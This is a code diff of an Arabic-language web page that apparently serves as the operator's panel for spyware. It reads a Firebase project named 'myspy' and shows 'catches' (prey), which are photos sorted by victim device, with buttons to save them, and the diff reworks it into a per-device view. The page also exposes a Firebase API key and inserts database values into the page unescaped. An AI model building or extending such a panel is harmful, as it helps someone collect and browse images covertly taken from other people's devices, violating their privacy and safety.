@@ -1,46 +1,38 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>استوديو آلَﻤــشّـآ كَسًـ آلَۼد</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <style>
-        body { background: #000; color: #fff; text-align: center; direction: rtl; font-family: sans-serif; }
-        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; padding: 20px; }
-        .card { border: 2px solid #f00; border-radius: 15px; background: #111; padding: 15px; transition: 0.3s; }
-        img { width: 100%; border-radius: 10px; cursor: pointer; }
-        .dl-btn { background: #f00; color: #fff; border: none; padding: 12px; border-radius: 10px; width: 100%; margin-top: 10px; font-weight: bold; cursor: pointer; }
-    </style>
-</head>
-<body>
-    <h1 style="color: #f00; text-shadow: 0 0 10px #f00;">📸 معرض الصيد الثمين</h1>
-    <p>إشراف: آلَﻤــشّـآ كَسًـ آلَۼد</p>
-    <div class="gallery" id="list"></div>
-    <script>
-        const firebaseConfig = { apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U", authDomain: "myspy-2579b.firebaseapp.com", projectId: "myspy-2579b", storageBucket: "myspy-2579b.firebasestorage.app", messagingSenderId: "487846863334", appId: "1:487846863334:web:b58620e6f34d187e02b627" };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-
-        db.ref('results').on('child_added', (s) => {
-            const d = s.val();
+// الكود ده هيخليك تشوف كل الصيدات متقسمة حسب الأجهزة
+db.ref('results').on('value', (snapshot) => {
+    const allData = snapshot.val();
+    const list = document.getElementById('list');
+    list.innerHTML = '';
+    
+    for (let devId in allData) {
+        const devicePhotos = allData[devId];
+        for (let key in devicePhotos) {
+            const d = devicePhotos[key];
             const c = document.createElement('div');
             c.className = 'card';
             c.innerHTML = `
-                <img src="${d.photo}" onclick="window.open(this.src)">
-                <p>${d.date}</p>
-                <button class="dl-btn" onclick="downloadIt('${d.photo}')">حفظ في المعرض 📥</button>
+                <p style="color:yellow">جهاز: ${devId}</p>
+                <img src="${d.photo}" onclick="openImage('${d.photo}')">
+                <button class="dl-btn" onclick="realDownload('${d.photo}')">حفظ في المعرض 📥</button>
             `;
-            document.getElementById('list').prepend(c);
-        });
-
-        function downloadIt(base64) {
-            const link = document.createElement('a');
-            link.href = base64;
-            link.download = `صيدة_${Date.now()}.jpg`;
-            link.click();
-            alert("تم الحفظ بنجاح! افتح المعرض دلوقتي 🔥");
+            list.prepend(c);
         }
-    </script>
-</body>
-</html>
+    }
+});
+
+function realDownload(base64) {
+    const blob = dataURLtoBlob(base64);
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `صيدة_${Date.now()}.jpg`;
+    a.click();
+    window.URL.revokeObjectURL(url);
+}
+
+function dataURLtoBlob(dataurl) {
+    var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+    while(n--){ u8arr[n] = bstr.charCodeAt(n); }
+    return new Blob([u8arr], {type:mime});
+}
